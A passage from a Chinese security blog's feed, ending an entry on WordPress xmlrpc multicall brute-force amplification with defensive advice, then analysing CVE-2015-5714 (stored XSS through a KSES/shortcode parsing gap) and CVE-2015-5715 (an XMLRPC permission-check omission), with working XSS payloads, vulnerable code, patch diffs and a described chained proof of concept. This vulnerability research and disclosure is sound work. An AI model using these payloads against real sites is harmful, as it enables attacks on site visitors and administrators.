class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">array</span>&gt;</span><span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">struct</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">member</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>isAdmin<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">boolean</span>&gt;</span>1<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">member</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">member</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>url<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>http://172.16.96.130/xampp/wordpress-4.3.1/<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">member</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">member</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>blogid<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">member</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">member</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>blogName<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>WordPress 4.3.1<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">member</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">member</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>xmlrpc<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>http://172.16.96.130/xampp/wordpress-4.3.1/xmlrpc.php<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">member</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struct</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span><span class="tag">&lt;/<span class="name">array</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span><span class="tag">&lt;/<span class="name">array</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">struct</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">member</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>faultCode<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">int</span>&gt;</span>403<span class="tag">&lt;/<span class="name">int</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">member</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">member</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>faultString<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>用户名或密码不正确。<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">member</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struct</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodResponse</span>&gt;</span></span><br></pre></td></tr></table></figure><p>从结果中可以看到在同一次请求里面处理了两种帐号密码组合，并以集中形式将结果返回，通过该种方式可以极大地提高帐号爆破效率。</p><h3 id="二、防护建议"><a href="#二、防护建议" class="headerlink" title="二、防护建议"></a>二、防护建议</h3><p>最新版 WordPress(4.3.1) 中仍存在该问题。多重调用（multicall）属于 xmlrpc 的标准，为了防止攻击者利用此点对网站发起爆破攻击，给出以下防护建议：</p><ol><li>通过配置 Apache、Nginx 等 Web 服务器来限制 xmlrpc.php 文件的访问;</li><li>在不影响站点运行的情况下可以直接删除 xmlrpc.php 文件;</li><li>从官方插件库中安装 <a href="https://wordpress.org/plugins/disable-xml-rpc/" target="_blank" rel="noopener">Disable XML-RPC</a> 并启用;</li><li>添加代码 <code>add_filter(&#39;xmlrpc_enabled&#39;, &#39;__return_false&#39;);</code> 至 WordPress 配置文件 <code>wp-config.php</code>;</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html" target="_blank" rel="noopener">https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html</a></li><li><a href="https://pop.co/blog/protecting-your-wordpress-blog-from-xmlrpc-brute-force-amplification-attacks/" target="_blank" rel="noopener">https://pop.co/blog/protecting-your-wordpress-blog-from-xmlrpc-brute-force-amplification-attacks/</a></li><li><a href="http://www.deluxeblogtips.com/2013/08/disable-xml-rpc-wordpress.html" target="_blank" rel="noopener">http://www.deluxeblogtips.com/2013/08/disable-xml-rpc-wordpress.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;xmlrpc 是 WordPress 中进行远程调用的接口，而使用 xmlrpc 调用接口进行账号爆破在很早之前就被提出并加以利用。近日 &lt;a href=&quot;https://blog.sucuri.net/2015/10/brute-force-amplification-a
      
    
    </summary>
    
    
      <category term="security" scheme="http://rickgray.me/tags/security/"/>
    
      <category term="web" scheme="http://rickgray.me/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>WordPress CVE-2015-5714 &amp; CVE-2015-5715 Analysis</title>
    <link href="http://rickgray.me/2015/09/18/wordpress-vulnerability-analysis-cve-2015-5714_and_cve-2015-5715/"/>
    <id>http://rickgray.me/2015/09/18/wordpress-vulnerability-analysis-cve-2015-5714_and_cve-2015-5715/</id>
    <published>2015-09-17T16:00:00.000Z</published>
    <updated>2018-04-24T15:48:57.517Z</updated>
    
    <content type="html"><![CDATA[<p>近日，WordPress 发布了新版本4.3.1，其中修复了几个严重的安全问题，其中包含了由 <a href="http://checkpoint.com/" target="_blank" rel="noopener">Check Point</a> 所提交的一个跨站脚本漏洞（CVE-2015-5714）和一个权限提升漏洞（CVE-2015-5715）。</p><p>8月初，Check Point 在其官方博客上发表了一篇关于 <a href="http://blog.checkpoint.com/2015/08/04/wordpress-vulnerabilities-1/" target="_blank" rel="noopener">《WordPress漏洞三部曲》</a> 系列文章的第一部，在这篇文章中，提及了 WordPress 在 4.2.3 版本中修复的一个越权漏洞，这里对此就不再做具体分析和说明，相关细节详情可参考原文和 phithon 所写的 <a href="http://security.tencent.com/index.php/blog/msg/93" target="_blank" rel="noopener">《Wordpress4.2.3提权与SQL注入漏洞(CVE-2015-5623)分析》</a>。</p><p>这里主要说明的是 “三部曲” 中的第三部，也就是 Check Point 在其博客上公开的关于 WordPress 4.3.1 版本中所修复的另一个越权漏洞和一个跨站脚本漏洞（原文在<a href="http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/" target="_blank" rel="noopener">这里</a>）。</p><h3 id="1-“KSES”与简码过滤差异化导致的-XSS"><a href="#1-“KSES”与简码过滤差异化导致的-XSS" class="headerlink" title="1. “KSES”与简码过滤差异化导致的 XSS"></a>1. “KSES”与简码过滤差异化导致的 XSS</h3><p>首先来看看跨站脚本漏洞。WordPress 在编辑文章内容时允许使用简码（shorcodes）来表示资源（图片，链接等）。WordPress 中开启了白名单机制去过滤 HTML 标签，只有在白名单规则里的标签，才允许被使用，并且会使用专用脚本 “KSES” 去检测和过滤这些 HTML 标签。这里需要说明的是，WordPress 对 HTML 标签的检测和过滤发生在将内容插入数据库时，而简码的解析渲染发生在将内容输出到页面时，下面简单用例子说明一下两个处理过程的差别，编辑文章插入内容为：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">TEST!!![caption width="1" caption='<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"' "</span>&gt;</span>]<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">a</span>&gt;</span>xxxxxx<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/articles/2015-09-18-wordpress-vulnerability-analysis-cve-2015-5714_and_cve-2015-5715/1.png" alt=""></p><p>因插入的内容包含完整且符合白名单规则的 HTML 标签，而简码 <code>[caption]</code>（<a href="http://codex.wordpress.org/Caption_Shortcode" target="_blank" rel="noopener">caption简码说明</a>） 并不包含在 “KSES” 检测的内容里，最后输出内容到前台时简码解析后会被渲染为：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>TEST!!!<span class="tag">&lt;<span class="name">figure</span> <span class="attr">style</span>=<span class="string">"width: 1px;"</span> <span class="attr">class</span>=<span class="string">"wp-caption alignnone"</span>&gt;</span><span class="tag">&lt;<span class="name">figcaption</span> <span class="attr">class</span>=<span class="string">"wp-caption-text"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;/figcaption&gt;&lt;/figure&gt;&lt;/a&gt;&lt;a&gt;xxxxxx&lt;/a&gt;&lt;/p&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/images/articles/2015-09-18-wordpress-vulnerability-analysis-cve-2015-5714_and_cve-2015-5715/2.png" alt=""></p><p>由于在 “KSES” 过滤检测时只关 HTML 标签，对简码并不进行检测，又因简码中属性都以 <code>KEY=VALUE</code> 的形式出现，用单引号<code>&#39;</code>或者双引号<code>&quot;</code>包裹值<code>Value</code>，因此在 <code>TEST!!![caption width=&quot;1&quot; caption=&#39;&lt;a href=&quot;&#39; &quot;&gt;]&lt;/a&gt;&lt;a&gt;xxxxxx&lt;/a&gt;</code> 这段内容中，简码 <code>caption</code> 有两个属性，分别为：</p><pre><code>width: 1caption: &lt;a href=&quot;</code></pre><p>而后半部分的 <code>&lt;a href=&quot;&#39; &quot;&gt;]&lt;/a&gt;&lt;a&gt;xxxxxx&lt;/a&gt;</code> 又为正常的 HTML 标签闭合形式，因此并不会被 “KSES” 检测过滤后丢弃掉。最终在前台输出时，简码 <code>caption</code> 被解析，使得最后出现 <code>&lt;a&gt;</code> 标签中 <code>href</code> 属性值未闭合的情况。</p><p>因此利用前后处理的差异，可以构造出有利的 payload 形成 XSS：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">TEST!!![caption width="1" caption='<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"' "</span>&gt;</span>]<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://onMouseOver='alert(1)'"</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将上面 payload 作为文章内容发布，前端渲染出来的结果为：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>TEST!!!<span class="tag">&lt;<span class="name">figure</span> <span class="attr">style</span>=<span class="string">"width: 1px;"</span> <span class="attr">class</span>=<span class="string">"wp-caption alignnone"</span>&gt;</span><span class="tag">&lt;<span class="name">figcaption</span> <span class="attr">class</span>=<span class="string">"wp-caption-text"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;/figcaption&gt;&lt;/figure&gt;&lt;/a&gt;&lt;a href="</span><span class="attr">http:</span>//<span class="attr">onMouseOver</span>=<span class="string">'alert(1)'</span>"&gt;</span>Click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/articles/2015-09-18-wordpress-vulnerability-analysis-cve-2015-5714_and_cve-2015-5715/3.png" alt=""></p><p>输出的内容在浏览器中解析成 <code>&lt;a&gt;</code> 标签部分，<code>href</code> 属性值为 <code>&lt;/figcaption&gt;&lt;/figure&gt;&lt;/a&gt;&lt;a href=</code>，而 <code>http://</code> 由于双斜杠(//)的原因与 <code>onMouseOver=&#39;alert(1)</code> 部分断开，因此一个 onmouseover 属性被解析出来，形成 XSS。</p><p><img src="/images/articles/2015-09-18-wordpress-vulnerability-analysis-cve-2015-5714_and_cve-2015-5715/4.png" alt=""></p><p>该漏洞（CVE-2015-5714）已经在 WordPress 新版 4.3.1 中修复，具体 patch 部分位于两处，第一处在 <code>wp-includes/shortcodes.php</code> 中的 shortcode_parse_atts() 函数中：</p><pre><code>--- wp-includes/shortcodes.php+++ wp-includes/shortcodes.php@@ -462,6 +462,15 @@             elseif (isset($m[8]))                 $atts[] = stripcslashes($m[8]);         }++        // Reject any unclosed HTML elements+        foreach( $atts as &amp;$value ) {+            if ( false !== strpos( $value, &apos;&lt;&apos; ) ) {+                if ( 1 !== preg_match( &apos;/^[^&lt;]*+(?:&lt;[^&gt;]*+&gt;[^&lt;]*+)*+$/&apos;, $value ) ) {+                    $value = &apos;&apos;;+                }+            }+        }     } else {         $atts = ltrim($text);     }</code></pre><p>新添加的处理过程，过滤了在简码属性值中出现的未闭合 HTML 标签的值。并且解析简码时使用 wp_kses() 函数进行了过滤，确保输出的内容被编码（代码位于 <code>wp-includes/media.php</code>）：</p><pre><code>--- wp-includes/media.php+++ wp-includes/media.php@@ -863,6 +863,8 @@             $content = $matches[1];             $attr[&apos;caption&apos;] = trim( $matches[2] );         }+    } elseif ( strpos( $attr[&apos;caption&apos;], &apos;&lt;&apos; ) !== false ) {+        $attr[&apos;caption&apos;] = wp_kses( $attr[&apos;caption&apos;], &apos;post&apos; );     }     /**</code></pre><p>这样一来就很难利用上面所说的 “KSES”和简码解析前后处理差异 成功构造出能够进行 XSS 的 HTML 标签了。</p><h3 id="2-权限检查遗漏导致越权操作"><a href="#2-权限检查遗漏导致越权操作" class="headerlink" title="2. 权限检查遗漏导致越权操作"></a>2. 权限检查遗漏导致越权操作</h3><p>Check Point 在文章中还提到了另一个越权操作（与 part1 的越权不同），可以使得不具有文章发布权限的用户通过 XMLRPC 操作将自己的文章状态修改为 <code>private</code>，并可将其置顶 （WordPress 4.3.0版本中已将其修复，未设密码的私有文章不可置顶）。</p><p>越权操作位于 XMLRPC 文章编辑操作中，涉及文件 <code>/wp-includes/class-wp-xmlrpc-server.php</code> (5042-5327) 其中关键代码分析：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">mw_editPost</span><span class="params">( $args )</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;escape( $args );</span><br><span class="line"></span><br><span class="line">        $post_ID        = (int) $args[<span class="number">0</span>];  <span class="comment">// 获取需要编辑的文章ID (用户所属)</span></span><br><span class="line">        $username       = $args[<span class="number">1</span>];  <span class="comment">// 从请求的xml中获取用户名</span></span><br><span class="line">        $password       = $args[<span class="number">2</span>];  <span class="comment">// 从请求的xml中获取用户密码</span></span><br><span class="line">        $content_struct = $args[<span class="number">3</span>];  <span class="comment">// 从请求的xml中获取结构</span></span><br><span class="line">        $publish        = <span class="keyword">isset</span>( $args[<span class="number">4</span>] ) ? $args[<span class="number">4</span>] : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        (...省略)</span><br><span class="line">        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $content_struct[<span class="string">"&#123;$post_type&#125;_status"</span>] ) ) &#123;</span><br><span class="line">            <span class="keyword">switch</span>( $content_struct[<span class="string">"&#123;$post_type&#125;_status"</span>] ) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'draft'</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'pending'</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'private'</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'publish'</span>:</span><br><span class="line">                    $post_status = $content_struct[<span class="string">"&#123;$post_type&#125;_status"</span>];  <span class="comment">// 数据库中存储的文章类型为post，所以取的是xml中 post_status 参数的值</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    $post_status = $publish ? <span class="string">'publish'</span> : <span class="string">'draft'</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">```     </span><br><span class="line"></span><br><span class="line">首先处理程序获取提交参数并验证当前用户权限，对于草稿或者未审核的文章，其数据库中存储的文章类型为 `post`，所以在取值 `$content_struct[<span class="string">"&#123;$post_type&#125;_status"</span>]` 时，获取的是提交参数中 `post_status` 的值。</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">        (...省略)</span><br><span class="line">        <span class="comment">// 当用户不具有文章发布权限时，`publish` 操作会被禁止</span></span><br><span class="line">        <span class="comment">// 但是这里并没有限制 `private` 的情况</span></span><br><span class="line">        <span class="comment">// 所以若xml中 post_status 参数值为 private 则跳过检查</span></span><br><span class="line">        <span class="keyword">if</span> ( (<span class="string">'publish'</span> == $post_status) ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( ( <span class="string">'page'</span> == $post_type ) &amp;&amp; ! current_user_can( <span class="string">'publish_pages'</span> ) ) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> IXR_Error( <span class="number">401</span>, __( <span class="string">'Sorry, you do not have the right to publish this page.'</span> ) );</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ( ! current_user_can( <span class="string">'publish_posts'</span> ) ) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> IXR_Error( <span class="number">401</span>, __( <span class="string">'Sorry, you do not have the right to publish this post.'</span> ) );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>接着，程序会验证其提交的需要更新的文章状态。当用户通过 XMLRPC 进行文章编辑时，若想发布一篇未发布的文章时，会检查用户是否具有文章发布的权限。但是该检查判断了将文章状态变为发布状态的情况下（post_status == publish），而针对将文章状态变为私有状态的情况代码中并没有进行检查。程序上的判断疏忽，致使我们可以使用一个不具有文章发布权限的帐号将自己一篇 <code>未通过审核</code> 或者 <code>存于垃圾箱</code> 的文章的转台通过该过程将其改为私有（<code>private</code>），让该文章以私文的形式在前台显示出来，管理员以及其他具有权限的用户都能浏览到。</p><p>另一个需要说明的点就是，通过 XMLRPC 操作编辑文章时，可以将文章进行置顶，具体代码为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(...省略)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将文章置顶（4.3.0 版本后不能将未设密码的私有文章置顶）</span></span><br><span class="line"><span class="comment">// Only posts can be sticky</span></span><br><span class="line"><span class="keyword">if</span> ( $post_type == <span class="string">'post'</span> &amp;&amp; <span class="keyword">isset</span>( $content_struct[<span class="string">'sticky'</span>] ) ) &#123;</span><br><span class="line">    $data = $newpost;</span><br><span class="line">    $data[<span class="string">'sticky'</span>] = $content_struct[<span class="string">'sticky'</span>];</span><br><span class="line">    $data[<span class="string">'post_type'</span>] = <span class="string">'post'</span>;</span><br><span class="line">    $error = <span class="keyword">$this</span>-&gt;_toggle_sticky( $data, <span class="keyword">true</span> );</span><br><span class="line">    <span class="keyword">if</span> ( $error ) &#123;</span><br><span class="line">        <span class="keyword">return</span> $error;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是该问题在 WordPress 4.3.0 版本中已经得到了限制：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_toggle_sticky</span><span class="params">( $post_data, $update = false )</span> </span>&#123;</span><br><span class="line">    $post_type = get_post_type_object( $post_data[<span class="string">'post_type'</span>] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Private and password-protected posts cannot be stickied.</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="string">'private'</span> === $post_data[<span class="string">'post_status'</span>] || ! <span class="keyword">empty</span>( $post_data[<span class="string">'post_password'</span>] ) ) &#123;</span><br><span class="line">        <span class="comment">// 如果需要置顶的文章为私有状态，并且未设访问密码，不能将其置顶，并自动取消之前的置顶状态</span></span><br><span class="line">        <span class="comment">// Error if the client tried to stick the post, otherwise, silently unstick.</span></span><br><span class="line">        <span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $post_data[<span class="string">'sticky'</span>] ) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> IXR_Error( <span class="number">401</span>, __( <span class="string">'Sorry, you cannot stick a private post.'</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( $update ) &#123;</span><br><span class="line">            unstick_post( $post_data[<span class="string">'ID'</span>] );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ( <span class="keyword">isset</span>( $post_data[<span class="string">'sticky'</span>] ) )  &#123;</span><br><span class="line">        <span class="comment">// 如果需要置顶的文章为私有状态，并且设有访问密码，且具有编辑其他文章的权限，则将其所置顶的文章置顶</span></span><br><span class="line">        <span class="keyword">if</span> ( ! current_user_can( $post_type-&gt;cap-&gt;edit_others_posts ) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> IXR_Error( <span class="number">401</span>, __( <span class="string">'Sorry, you are not allowed to stick this post.'</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $sticky = wp_validate_boolean( $post_data[<span class="string">'sticky'</span>] );</span><br><span class="line">        <span class="keyword">if</span> ( $sticky ) &#123;</span><br><span class="line">            stick_post( $post_data[<span class="string">'ID'</span>] );</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            unstick_post( $post_data[<span class="string">'ID'</span>] );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>未设密码访问的私有文章已经无法再通过 XMLRPC 编辑文章操作将文章置顶。</p><p>下面通过示例来说明如何通过 XMLRPC 编辑文章操作将文章状态修改为 <code>私有</code>。为了方便演示，这里事先注册好一个用户（投稿者权限，其投稿的文章状态为 <code>pending</code>），并提交一篇文章投递申请：</p><p><img src="/images/articles/2015-09-18-wordpress-vulnerability-analysis-cve-2015-5714_and_cve-2015-5715/5.png" alt=""></p><p>查看一下待审文章在数据库中的状态：</p><p><img src="/images/articles/2015-09-18-wordpress-vulnerability-analysis-cve-2015-5714_and_cve-2015-5715/6.png" alt=""></p><p>然后根据上面所分析的权限提升细节，构造 payload ，将此待审文章状态更改为 <code>private</code>：</p><p><img src="/images/articles/2015-09-18-wordpress-vulnerability-analysis-cve-2015-5714_and_cve-2015-5715/7.png" alt=""></p><p>可以看到返回消息中提示置顶私有文章失败，这是因为测试时使用的 WordPress 4.3.0 版本，该版本中已经修复了私有文章任意置顶的问题。</p><p>然后查看一下通过 XMLRPC 编辑文章后数据库中待审核文章的状态：</p><p><img src="/images/articles/2015-09-18-wordpress-vulnerability-analysis-cve-2015-5714_and_cve-2015-5715/8.png" alt=""></p><p>数据库中文章状态已经变为私有，再到前台查看首页：</p><p><img src="/images/articles/2015-09-18-wordpress-vulnerability-analysis-cve-2015-5714_and_cve-2015-5715/10.png" alt=""></p><p>由投稿用户提交的待审核文章已经变为私有状态显示在前台页面中，并且管理员能看到所有的私有文章。</p><h3 id="3-结合跨站脚本和越权操作"><a href="#3-结合跨站脚本和越权操作" class="headerlink" title="3. 结合跨站脚本和越权操作"></a>3. 结合跨站脚本和越权操作</h3><p>本文一开时已经分析过了如何通过利用 “KSES”与简码过滤差异化造成一个存储型的前台 XSS，加上第二节所演示越权编辑文章状态的过程，结合这两个漏洞，可以使得站点上具有一点权限的用户（投稿即可），投递包含恶意内容的文章，然后利用越权操作将文章显示到前台，对能够浏览到该文章的用户（包括管理员）进行 XSS 攻击。</p><p>下面我们模拟一下上面叙述的流程。首先投递一篇包含 XSS payload 的文章，利用 “KSES”与简码渲染操作的差异使得内容在前台渲染后能够形成 XSS，将文章内容设置为：</p><pre><code>XSS LOL!!![caption width=&apos;1&apos; caption=&apos;&lt;a href=&quot;&apos; &quot;&gt;]&lt;/a&gt;&lt;a href=&quot;http://onMouseOver=&apos;alert(/xss/)&apos; style=&apos;display:block;position:absolute;top:0px;left:0px;margin-left:-1000px;margin-top:-1000px;width:99999px;height:99999px;&apos;&quot;&gt;&lt;/a&gt;</code></pre><p><img src="/images/articles/2015-09-18-wordpress-vulnerability-analysis-cve-2015-5714_and_cve-2015-5715/11.png" alt=""></p><p>然后利用 XMLRPC 遍历文章得到提交的待审核文章的 id，这里得到待审核文章 id 为：<code>28</code>，在构造 payload 将其未发布状态改为私有：</p><p><img src="/images/articles/2015-09-18-wordpress-vulnerability-analysis-cve-2015-5714_and_cve-2015-5715/12.png" alt=""></p><p>利用 XMLRPC 文章编辑成功修改文章状态为私有后，访问前台查看结果：</p><p><img src="/images/articles/2015-09-18-wordpress-vulnerability-analysis-cve-2015-5714_and_cve-2015-5715/13.png" alt=""></p><h3 id="4-三部曲之歌"><a href="#4-三部曲之歌" class="headerlink" title="4. 三部曲之歌"></a>4. 三部曲之歌</h3><p>回顾 Check Point 所发布的《WordPress漏洞三部曲》，可以知道 WordPress 在 4.2.2 版本中含有其提交的所有漏洞，包括了 <code>竞争条件下权限提升</code>，<code>文章恢复导致SQL注入</code>，<code>&quot;KSES&quot;与简码过滤差异化导致的XSS</code>，<code>权限检查遗漏导致越权操作</code> 等。通看起来，如果在  WordPress 4.2.2 版本下，这些漏洞都能在以 <code>竞争条件下权限提升</code> 作为起始，完成后面的攻击，实现一个超低权限用户下进行 SQL 注入、XSS 攻击的操作。我将 Check Point 在 part1 和 part3 中所提到的漏洞利用方法综合到一起，写出了 <code>all in one</code> 的 PoC，其中 <code>竞争条件下权限提升</code> 的过程使用 phithon 文章中所提及的使用两个订阅用户来解决 7 天攻击周期的限制。</p><p>为了达到 <code>all in one</code> 的演示结果，将 WordPress 测试环境更换为 4.2.2 版本，并事先准备两个订阅用户 <code>guest:guest888</code>，<code>test:test888</code>，然后运行 PoC：</p><p><img src="/images/articles/2015-09-18-wordpress-vulnerability-analysis-cve-2015-5714_and_cve-2015-5715/15.png" alt=""></p><p>PoC 提示成功后，管理员访问前台，文章成功置顶并包含恶意代码：</p><p><img src="/images/articles/2015-09-18-wordpress-vulnerability-analysis-cve-2015-5714_and_cve-2015-5715/16.png" alt=""></p><h3 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h3><p>这里不得不佩服洞主对 WordPress 熟悉程度和漏洞挖掘的思路。</p><p>虽然 WordPress 在几个连续的版本中修复了这些漏洞，但在非最新版本中（&lt; 4.3.1）中，这些漏洞还是能够在特定场景下得以利用。尤其是在 4.2.2 版本中，能够利用 “三部曲” 中所提及的漏洞进行一系列的攻击操作。</p><p>这些看似鸡肋的漏洞在我看来并不鸡肋，鸡肋只是因为还未找到合适的应用场景而已。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://wordpress.org/news/2015/09/wordpress-4-3-1/" target="_blank" rel="noopener">https://wordpress.org/news/2015/09/wordpress-4-3-1/</a></li><li><a href="http://blog.checkpoint.com/2015/08/04/wordpress-vulnerabilities-1/" target="_blank" rel="noopener">http://blog.checkpoint.com/2015/08/04/wordpress-vulnerabilities-1/</a></li><li><a href="http://blog.checkpoint.com/2015/08/11/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-ii-supremacy/" target="_blank" rel="noopener">http://blog.checkpoint.com/2015/08/11/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-ii-supremacy/</a></li><li><a href="http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/" target="_blank" 